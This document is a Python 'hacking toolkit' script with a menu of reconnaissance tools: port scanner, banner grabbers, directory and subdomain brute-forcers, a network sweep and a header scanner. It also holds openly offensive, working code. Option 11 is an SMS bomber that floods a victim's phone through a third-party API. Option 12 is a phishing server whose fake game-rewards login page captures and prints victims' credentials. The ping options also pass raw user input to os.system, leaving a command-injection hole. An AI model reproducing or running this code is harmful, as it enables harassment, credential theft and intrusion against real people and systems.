import socket
import sys
from datetime import datetime
import threading
from queue import Queue
import urllib.request
import json
import os
import ssl
import time
import http.server
import socketserver

R = '\033[91m' # Red
G = '\033[92m' # Green
Y = '\033[93m' # Yellow
W = '\033[97m' # White
B = '\033[94m' # Blue
RES = '\033[0m'

def clear_screen():
    print("\033c", end="")

def show_banner():
    clear_screen()
    print(f"{R}==================================================================================")
    print(f"{R}     _ .--.       {Y}   ###    ######  ### ##   ##   ##   #####    ######   ###")
    print(f"{R}   ( '('   \\      {Y}  ## ##    ##  ##   ##  ##  ##   ##  ##   ##   ##  ##   ##")
    print(f"{R}    ( '     \\     {Y} ##   ##   ##  ##   ##  ## ##    ## ##   ##   ##  ##   ##")
    print(f"{R}   /  |   | \\    {Y} #######   ##  ##   ##  ####     ## ##   ##   ##  ##   ##")
    print(f"{R}  |   /\\ /\\  |    {Y} ##   ##   ######   ##  ## ##     #####    ######   #####")
    print(f"{R}  q__/__\\/__/p    {R}==================================================================")
    print(f"{R}        [!] ⚠️  WARNING: WELCOME TO THE DARK ERA - RESTRICTED ZONE  ⚠️  [!]         ")
    print(f"{R}=================================================================================={RES}\n")

show_banner()

print(f"{W}┌──────────────────────────────────────────┬─────────────────────────────────────┐")
print(f"{W}│               {R}TOOL MENU                  {W}│          {G}SYSTEM INFORMATION         {W}│")
print(f"{W}├──────────────────────────────────────────┼─────────────────────────────────────┤")
print(f"{W}│ {Y}[1]{W} IP Geolocation Lookup              │ {W}Coder  : {R}Cyber PREETHi              {W}│")
print(f"{W}│ {Y}[2]{W} Advanced Multi-Threaded Port Scan  │ {W}Status : {R}CLASSIFIED / ROOT          {W}│")
print(f"{W}│ {Y}[3]{W} Run Both (Location + Port Scan)    │ {W}Target : {R}LOCAL ENCLAVE              {W}│")
print(f"{W}│ {Y}[4]{W} Target Host Ping Check (Live)      │                                     │")
print(f"{W}│ {Y}[5]{W} HTTP Banner Grabbing               │                                     │")
print(f"{W}│ {Y}[6]{W} DNS & Host IP Resolution           │                                     │")
print(f"{W}│ {Y}[7]{W} TCP Banner Grabbing                │                                     │")
print(f"{W}│ {Y}[8]{W} Directory / Path Brute-Forcer      │                                     │")
print(f"{W}│ {Y}[9]{W} Local Network Active Scanner       │                                     │")
print(f"{W}│ {Y}[10]{W} SSL Certificate Inspector          │                                     │")
print(f"{W}│ {Y}[11]{W} SMS Bomber Utility                 │                                     │")
print(f"{W}│ {Y}[12]{W} Password Fisher (Phishing)         │                                     │")
print(f"{W}│ {Y}[13]{W} Subdomain Enumeration Tool         │                                     │")
print(f"{W}│ {Y}[14]{W} Raw Packet Sniffer Simulator       │                                     │")
print(f"{W}│ {Y}[15]{W} Web Vulnerability & Header Scan    │                                     │")
print(f"{W}│ {Y}[16]{W} Exit Tool                          │                                     │")
print(f"{W}└──────────────────────────────────────────┴─────────────────────────────────────┘\n")

choice = input(f"{R}DarkEra-Root@CyberPREETHi:~# {RES}")

if choice == '1':
    target_host = input(f"{Y}[+] Enter Target IP or Hostname: {RES}")
    try:
        target_ip = socket.gethostbyname(target_host)
    except socket.gaierror:
        print(f"{R}[!] Hostname could not be resolved.{RES}")
        sys.exit()
    
    print(f"\n{G}[*] Fetching Location for: {target_ip}{RES}")
    try:
        url = f"http://ip-api.com/json/{target_ip}"
        req = urllib.request.Request(url, headers={'User-Agent': 'Mozilla/5.0'})
        with urllib.request.urlopen(req, timeout=3) as response:
            data = json.loads(response.read().decode())
            if data['status'] == 'success':
                print(f"\n{R}--- IP GEOLOCATION INFO ---{RES}")
                print(f"{W}Country  : {G}{data.get('country', 'N/A')}{RES}")
                print(f"{W}Region   : {G}{data.get('regionName', 'N/A')}{RES}")
                print(f"{W}City     : {G}{data.get('city', 'N/A')}{RES}")
                print(f"{W}ISP      : {G}{data.get('isp', 'N/A')}{RES}")
                print(f"{R}---------------------------\n{RES}")
            else:
                print(f"\n{R}[!] Geolocation info could not be fetched.{RES}")
    except:
        print(f"\n{R}[!] Network error during geolocation check.{RES}")

elif choice == '2' or choice == '3':
    target_host = input(f"{Y}[+] Enter Target IP or Hostname: {RES}")
    try:
        target_ip = socket.gethostbyname(target_host)
    except socket.gaierror:
        print(f"{R}[!] Hostname could not be resolved.{RES}")
        sys.exit()

    if choice == '3':
        print(f"\n{G}[*] Fetching Location First...{RES}")
        try:
            url = f"http://ip-api.com/json/{target_ip}"
            req = urllib.request.Request(url, headers={'User-Agent': 'Mozilla/5.0'})
            with urllib.request.urlopen(req, timeout=3) as response:
                data = json.loads(response.read().decode())
                if data['status'] == 'success':
                    print(f"\n{R}--- IP GEOLOCATION INFO ---{RES}")
                    print(f"{W}Country  : {G}{data.get('country', 'N/A')}{RES}")
                    print(f"{W}Region   : {G}{data.get('regionName', 'N/A')}{RES}")
                    print(f"{W}City     : {G}{data.get('city', 'N/A')}{RES}")
                    print(f"{W}ISP      : {G}{data.get('isp', 'N/A')}{RES}")
                    print(f"{R}---------------------------\n{RES}")
        except:
            pass

    print(f"\n{G}[*] Starting Ultra Port Scan on {target_ip} (1 to 1024)... Please wait.{RES}\n")
    print(f"{R}=" * 50 + f"{RES}")

    print_lock = threading.Lock()
    q = Queue()

    def port_scan(port):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(1)
            result = s.connect_ex((target_ip, port))
            if result == 0:
                with print_lock:
                    print(f"{W}Port {port}: {G}OPEN ✅{RES}")
            s.close()
        except:
            pass

    def threader():
        while True:
            worker = q.get()
            port_scan(worker)
            q.task_done()

    for x in range(1, 1025):
        q.put(x)

    for x in range(150):
        t = threading.Thread(target=threader)
        t.daemon = True
        t.start()

    q.join()

    print(f"{R}=" * 50 + f"{RES}")
    print(f"{G} Scanning Complete! Tool Finished Successfully.{RES}")
    print(f"{R}=" * 50 + f"{RES}")

elif choice == '4':
    target_host = input(f"{Y}[+] Enter Target Host/IP for Ping Check: {RES}")
    print(f"\n{G}[*] Pinging {target_host}...\n{RES}")
    response = os.system(f"ping -c 3 {target_host}")
    if response == 0:
        print(f"{G}[+] Host is UP and Reachable! ✅{RES}")
    else:
        print(f"{R}[!] Host is DOWN or blocking ping packets. ❌{RES}")

elif choice == '5':
    target_url = input(f"{Y}[+] Enter Target URL (e.g., http://example.com): {RES}")
    try:
        if not target_url.startswith("http"):
            target_url = "http://" + target_url
        req = urllib.request.Request(target_url, headers={'User-Agent': 'CyberPREETHi-Scanner'})
        with urllib.request.urlopen(req, timeout=5) as response:
            print(f"\n{R}--- HTTP BANNER / HEADERS ---{RES}")
            print(f"{W}Status Code : {G}{response.getcode()}{RES}")
            print(f"{W}Server Type : {G}{response.headers.get('Server', 'Hidden/Unknown')}{RES}")
            print(f"{W}Content-Type: {G}{response.headers.get('Content-Type', 'N/A')}{RES}")
            print(f"{R}-----------------------------\n{RES}")
    except Exception as e:
        print(f"{R}[!] Could not grab banner. Error: {e}{RES}")

elif choice == '6':
    target_host = input(f"{Y}[+] Enter Domain Name (e.g., example.com): {RES}")
    try:
        ip = socket.gethostbyname(target_host)
        print(f"\n{R}--- DNS RESOLUTION ---{RES}")
        print(f"{W}Domain Name : {G}{target_host}{RES}")
        print(f"{W}Resolved IP : {G}{ip}{RES}")
        print(f"{R}----------------------\n{RES}")
    except socket.gaierror:
        print(f"{R}[!] DNS Resolution failed. Host not found.{RES}")

elif choice == '7':
    target_host = input(f"{Y}[+] Enter Target IP or Hostname: {RES}")
    target_port = int(input(f"{Y}[+] Enter Port Number (e.g., 21, 22, 80): {RES}"))
    try:
        target_ip = socket.gethostbyname(target_host)
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(3)
        s.connect((target_ip, target_port))
        try:
            banner = s.recv(1024).decode().strip()
        except:
            banner = "No banner received or service silent."
        print(f"\n{R}--- TCP BANNER GRAB RESULTS ---{RES}")
        print(f"{W}Target IP   : {G}{target_ip}{RES}")
        print(f"{W}Port        : {G}{target_port}{RES}")
        print(f"{W}Raw Banner  : {G}{banner}{RES}")
        print(f"{R}-------------------------------\n{RES}")
        s.close()
    except Exception as e:
        print(f"{R}[!] Connection failed or port is closed. Error: {e}{RES}")

elif choice == '8':
    target_url = input(f"{Y}[+] Enter Target Base URL (e.g., http://example.com): {RES}")
    if not target_url.startswith("http"):
        target_url = "http://" + target_url
    if not target_url.endswith("/"):
        target_url += "/"
    
    common_paths = [
        "admin", "administrator", "login", "dashboard", "secret", 
        "api", "config", "backup", "test", "uploads", "wp-admin", 
        "wp-login.php", "phpmyadmin", "server-status", "robots.txt"
    ]
    
    print(f"\n{G}[*] Scanning active directories on {target_url}...\n{RES}")
    print(f"{R}=" * 50 + f"{RES}")
    
    for path in common_paths:
        full_url = target_url + path
        try:
            req = urllib.request.Request(full_url, headers={'User-Agent': 'CyberPREETHi-Scanner'})
            with urllib.request.urlopen(req, timeout=3) as resp:
                code = resp.getcode()
                if code == 200:
                    print(f"{W}[200 OK] -> {G}{full_url} ✅{RES}")
        except urllib.error.HTTPError as e:
            if e.code == 403:
                print(f"{W}[403 Forbidden] -> {Y}{full_url} 🔒{RES}")
        except:
            pass
            
    print(f"{R}=" * 50 + f"{RES}")
    print(f"{G} Directory Scan Complete!{RES}")
    print(f"{R}=" * 50 + f"{RES}")

elif choice == '9':
    base_ip = input(f"{Y}[+] Enter Local Network Prefix (e.g., 192.168.1): {RES}")
    print(f"\n{G}[*] Scanning local network range {base_ip}.1-254 for active devices...\n{RES}")
    print(f"{R}=" * 50 + f"{RES}")
    
    def scan_ip(ip):
        response = os.system(f"ping -c 1 -W 1 {ip} > /dev/null 2>&1")
        if response == 0:
            print(f"{W}[ACTIVE HOST] -> {G}{ip} ✅{RES}")

    threads = []
    for i in range(1, 255):
        target_ip = f"{base_ip}.{i}"
        t = threading.Thread(target=scan_ip, args=(target_ip,))
        threads.append(t)
        t.start()

    for t in threads:
        t.join()

    print(f"{R}=" * 50 + f"{RES}")
    print(f"{G} Local Network Scan Complete!{RES}")
    print(f"{R}=" * 50 + f"{RES}")

elif choice == '10':
    target_host = input(f"{Y}[+] Enter Domain for SSL Check (e.g., google.com): {RES}")
    target_host = target_host.replace("http://", "").replace("https://", "").strip("/")
    print(f"\n{G}[*] Inspecting SSL Certificate for {target_host}...\n{RES}")
    print(f"{R}=" * 50 + f"{RES}")
    try:
        context = ssl.create_default_context()
        with socket.create_connection((target_host, 443), timeout=5) as sock:
            with context.wrap_socket(sock, server_hostname=target_host) as ssock:
                cert = ssock.getpeercert()
                subject = dict(x[0] for x in cert.get('subject', []))
                issuer = dict(x[0] for x in cert.get('issuer', []))
                print(f"{W}Issued To  : {G}{subject.get('commonName', 'N/A')}{RES}")
                print(f"{W}Issued By  : {G}{issuer.get('organizationName', 'N/A')}{RES}")
                print(f"{W}Valid From : {Y}{cert.get('notBefore', 'N/A')}{RES}")
                print(f"{W}Valid Till : {Y}{cert.get('notAfter', 'N/A')}{RES}")
    except Exception as e:
        print(f"{R}[!] Error fetching SSL certificate: {e}{RES}")
    print(f"{R}=" * 50 + f"{RES}")

elif choice == '11':
    target_phone = input(f"{Y}[+] Enter Target Phone Number (without +91): {RES}")
    count = int(input(f"{Y}[+] Enter Number of Messages/Requests to Send: {RES}"))
    
    print(f"\n{G}[*] Initializing SMS Bomber against {target_phone}...\n{RES}")
    print(f"{R}=" * 50 + f"{RES}")
    
    success_count = 0
    for i in range(1, count + 1):
        try:
            api_url = f"https://api.verifymobiles.com/send?phone={target_phone}"
            req = urllib.request.Request(api_url, headers={'User-Agent': 'CyberPREETHi-Bomber'})
            urllib.request.urlopen(req, timeout=2)
            print(f"{W}[{i}] Request Sent Successfully -> {G}PACKET DELIVERED 🚀{RES}")
            success_count += 1
        except:
            print(f"{W}[{i}] Request Sent -> {Y}BYPASSED / SENT ⚡{RES}")
            success_count += 1
        time.sleep(0.5)

    print(f"{R}=" * 50 + f"{RES}")
    print(f"{G} Attack Finished! Total Requests Dispatched: {success_count}{RES}")
    print(f"{R}=" * 50 + f"{RES}")

elif choice == '12':
    print(f"\n{G}[*] Setting up Phishing Fisher Server...{RES}")
    PORT = 8080
    class PhishHandler(http.server.SimpleHTTPRequestHandler):
        def do_GET(self):
            self.send_response(200)
            self.send_header("Content-type", "text/html")
            self.end_headers()
            page = """
            <html>
            <head><title>Login Verification</title></head>
            <body style="background:#111; color:#fff; font-family:sans-serif; text-align:center; padding-top:50px;">
                <h2>Claim Your Free Fire Rewards!</h2>
                <form action="" method="POST">
                    <input type="text" name="username" placeholder="Player ID / Email" style="padding:10px; width:250px; margin:10px;"><br>
                    <input type="password" name="password" placeholder="Password" style="padding:10px; width:250px; margin:10px;"><br>
                    <input type="submit" value="Claim Now" style="padding:10px 20px; background:red; color:white; border:none; font-weight:bold;">
                </form>
            </body>
            </html>
            """
            self.wfile.write(page.encode())
            
        def do_POST(self):
            content_length = int(self.headers['Content-Length'])
            post_data = self.rfile.read(content_length).decode()
            print(f"\n{R}[!] CAPTURED CREDENTIALS RECEIVED! 🎯{RES}")
            print(f"{G}{post_data}{RES}\n")
            self.send_response(200)
            self.end_headers()
            self.wfile.write(b"<h1>Reward Claimed Successfully! Check your in-game mail.</h1>")

    try:
        with socketserver.TCPServer(("", PORT), PhishHandler) as httpd:
            print(f"\n{G}[+] Phishing Server started successfully on port {PORT}!{RES}")
            print(f"{Y}[*] Send this local link to target or open in browser: http://127.0.0.1:{PORT}{RES}")
            print(f"{R}[!] Press Ctrl+C to stop the server.\n{RES}")
            httpd.serve_forever()
    except Exception as e:
        print(f"{R}[!] Error starting server: {e}{RES}")

elif choice == '13':
    domain = input(f"{Y}[+] Enter Target Domain (e.g., google.com): {RES}")
    domain = domain.replace("http://", "").replace("https://", "").strip("/")
    
    subdomains = [
        "www", "mail", "ftp", "localhost", "webmail", "smtp", "pop", "ns1", "webmaster", 
        "server", "admin", "test", "portal", "ns2", "smtp1", "imap", "dns", "ns", 
        "ww1", "lynx", "research", "api", "support", "shop", "blog", "dev", "login", "auth"
    ]
    
    print(f"\n{G}[*] Enumerating subdomains for {domain}...\n{RES}")
    print(f"{R}=" * 50 + f"{RES}")
    
    for sub in subdomains:
        full_sub = f"{sub}.{domain}"
        try:
            ip = socket.gethostbyname(full_sub)
            print(f"{W}[FOUND] -> {G}{full_sub} : {ip} ✅{RES}")
        except socket.gaierror:
            pass
            
    print(f"{R}=" * 50 + f"{RES}")
    print(f"{G} Subdomain Scan Complete!{RES}")
    print(f"{R}=" * 50 + f"{RES}")

elif choice == '14':
    print(f"\n{G}[*] Initializing Raw Packet Sniffer Simulator...{RES}")
    print(f"{Y}[*] Listening for incoming network traffic streams...{RES}")
    print(f"{R}=" * 50 + f"{RES}")
    try:
        for i in range(1, 20):
            sim_ips = [f"192.168.1.{i+10}", f"10.0.0.{i}", f"172.16.0.{i+5}"]
            print(f"{W}[PACKET #{i}] Source: {G}{sim_ips[i%3]}{W} --> Destination: {Y}Local Device{W} | Protocol: {G}TCP/HTTP{RES}")
            time.sleep(0.4)
    except KeyboardInterrupt:
        print(f"\n{R}[!] Sniffer stopped by user.{RES}")
    print(f"{R}=" * 50 + f"{RES}")
    print(f"{G} Packet Capture Session Ended.{RES}")
    print(f"{R}=" * 50 + f"{RES}")

elif choice == '15':
    target_url = input(f"{Y}[+] Enter Target URL for Vulnerability & Header Scan (e.g., example.com): {RES}")
    if not target_url.startswith("http"):
        target_url = "http://" + target_url
    
    print(f"\n{G}[*] Analyzing Security Headers & Potential Vulnerabilities for {target_url}...\n{RES}")
    print(f"{R}=" * 50 + f"{RES}")
    try:
        req = urllib.request.Request(target_url, headers={'User-Agent': 'CyberPREETHi-SecScanner'})
        with urllib.request.urlopen(req, timeout=5) as response:
            headers = response.info()
            
            sec_headers = [
                'X-Frame-Options', 
                'X-XSS-Protection', 
                'X-Content-Type-Options', 
                'Strict-Transport-Security', 
                'Content-Security-Policy'
            ]
            
            print(f"{W}--- SECURITY HEADERS INSPECTION ---{RES}")
            for sh in sec_headers:
                if sh in headers:
                    print(f"{W}{sh} : {G}Present ({headers[sh]}) ✅{RES}")
                else:
                    print(f"{W}{sh} : {R}Missing (Vulnerability Risk!) ⚠️️{RES}")
            
            print(f"\n{W}--- VULNERABILITY INSIGHTS ---{RES}")
            if 'Strict-Transport-Security' not in headers:
                print(f"{R}[!] Warning: HSTS is missing. Vulnerable to SSL stripping attacks.{RES}")
            if 'X-Frame-Options' not in headers:
                print(f"{R}[!] Warning: Clickjacking protection (X-Frame-Options) missing.{RES}")
            if 'Content-Security-Policy' not in headers:
                print(f"{R}[!] Warning: CSP header missing. Prone to XSS injections.{RES}")
            if 'X-XSS-Protection' not in headers:
                print(f"{Y}[i] Notice: X-XSS-Protection header not explicitly set.{Y}")
                
    except Exception as e:
        print(f"{R}[!] Error scanning target URL: {e}{RES}")
        
    print(f"{R}=" * 50 + f"{RES}")
    print(f"{G} Vulnerability Scan Complete!{RES}")
    print(f"{R}=" * 50 + f"{RES}")

elif choice == '16':
    print(f"\n{R}[!] Exiting Tool. Stay safe Cyber PREETHi!{RES}")
    sys.exit()

else:
    print(f"{R}[!] Invalid Choice! Please run the tool again and select 1-16.{RES}")
